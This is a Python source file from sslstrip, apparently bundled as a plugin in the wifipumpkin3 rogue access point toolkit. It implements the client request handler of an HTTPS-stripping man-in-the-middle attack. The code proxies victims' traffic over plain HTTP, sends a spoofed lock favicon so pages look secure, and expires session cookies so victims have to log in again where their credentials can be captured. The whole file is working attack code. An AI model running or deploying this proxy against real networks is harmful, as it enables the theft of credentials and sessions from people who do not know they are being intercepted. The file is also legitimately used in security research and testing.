# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, os, sys, random

from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient

from twisted.internet import ssl
from twisted.internet import defer
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from wifipumpkin3.plugins.external.sslstrip.ServerConnectionFactory import (
    ServerConnectionFactory,
)
from wifipumpkin3.plugins.external.sslstrip.ServerConnection import ServerConnection
from wifipumpkin3.plugins.external.sslstrip.SSLServerConnection import (
    SSLServerConnection,
)
from wifipumpkin3.plugins.external.sslstrip.URLMonitor import URLMonitor
from wifipumpkin3.plugins.external.sslstrip.CookieCleaner import CookieCleaner
from wifipumpkin3.plugins.external.sslstrip.DnsCache import DnsCache


class ClientRequest(Request):

    """ This class represents incoming client requests and is essentially where
    the magic begins.  Here we remove the client headers we dont like, and then
    respond with either favicon spoofing, session denial, or proxy through HTTP
    or SSL to the server.
    """

    def __init__(self, channel, queued, reactor=reactor):
        Request.__init__(self, channel, queued)
        self.reactor = reactor
        self.urlMonitor = URLMonitor.getInstance()
        self.cookieCleaner = CookieCleaner.getInstance()
        self.dnsCache = DnsCache.getInstance()

    #        self.uniqueId      = random.randint(0, 10000)

    def cleanHeaders(self):
        headers = self.getAllHeaders().copy()

        if "accept-encoding" in headers:
            del headers["accept-encoding"]

        if "if-modified-since" in headers:
            del headers["if-modified-since"]

        if "cache-control" in headers:
            del headers["cache-control"]

        return headers

    def getPathFromUri(self):
        if self.uri.decode().find("http://") == 0:
            index = self.uri.decode().find("/", 7)
            return self.uri[index:]

        return self.uri

    def getPathToLockIcon(self):
        if os.path.exists("lock.ico"):
            return "lock.ico"

        scriptPath = os.path.abspath(os.path.dirname(sys.argv[0]))
        scriptPath = os.path.join(scriptPath, "../share/sslstrip/lock.ico")

        if os.path.exists(scriptPath):
            return scriptPath

        logging.warning("Error: Could not find lock.ico")
        return "lock.ico"

    def handleHostResolvedSuccess(self, address):
        print(
            "Resolved host successfully: %s -> %s" % (self.getHeader("host"), address)
        )
        host = self.getHeader("host")
        headers = self.cleanHeaders()
        client = self.getClientIP()
        path = self.getPathFromUri()

        self.content.seek(0, 0)
        postData = self.content.read()
        print("cookies...")
        url = "http://" + host + path.decode()
        print("cookies...")
        self.uri = url  # set URI to absolute

        self.dnsCache.cacheResolution(host, address)

        if not self.cookieCleaner.isClean(self.method, client, host, headers):
            print("Sending expired cookies...")
            self.sendExpiredCookies(
                host,
                path,
                self.cookieCleaner.getExpireHeaders(
                    self.method, client, host, headers, path
                ),
            )
        elif self.urlMonitor.isSecureFavicon(client, path):
            print("Sending spoofed favicon response...")
            self.sendSpoofedFaviconResponse()
        elif self.urlMonitor.isSecureLink(client, url):
            print("Sending request via SSL...")
            self.proxyViaSSL(
                address,
                self.method,
                path,
                postData,
                headers,
                self.urlMonitor.getSecurePort(client, url),
            )
        else:
            print("Sending request via HTTP...")
            self.proxyViaHTTP(address, self.method, path, postData, headers)

    def handleHostResolvedError(self, error):
        logging.warning("Host resolution error: " + str(error))
        self.finish()

    def resolveHost(self, host):
        address = self.dnsCache.getCachedAddress(host)

        if address != None:
            print("Host cached.")
            return defer.succeed(address)
        else:
            print("Host not cached.")
            return reactor.resolve(host)

    def process(self):
        print("Resolving host: %s" % (self.getHeader("host")))
        host = self.getHeader("host")
        deferred = self.resolveHost(host)

        deferred.addCallback(self.handleHostResolvedSuccess)
        deferred.addErrback(self.handleHostResolvedError)

    def proxyViaHTTP(self, host, method, path, postData, headers):
        connectionFactory = ServerConnectionFactory(
            method, path, postData, headers, self
        )
        connectionFactory.protocol = ServerConnection
        self.reactor.connectTCP(host, 80, connectionFactory)

    def proxyViaSSL(self, host, method, path, postData, headers, port):
        clientContextFactory = ssl.ClientContextFactory()
        connectionFactory = ServerConnectionFactory(
            method, path, postData, headers, self
        )
        connectionFactory.protocol = SSLServerConnection
        self.reactor.connectSSL(host, port, connectionFactory, clientContextFactory)

    def sendExpiredCookies(self, host, path, expireHeaders):
        self.setResponseCode(302, "Moved")
        self.setHeader("Connection", "close")
        self.setHeader("Location", "http://" + host + path)

        for header in expireHeaders:
            self.setHeader("Set-Cookie", header)

        self.finish()

    def sendSpoofedFaviconResponse(self):
        icoFile = open(self.getPathToLockIcon())

        self.setResponseCode(200, "OK")
        self.setHeader("Content-type", "image/x-icon")
        self.write(icoFile.read())

        icoFile.close()
        self.finish()
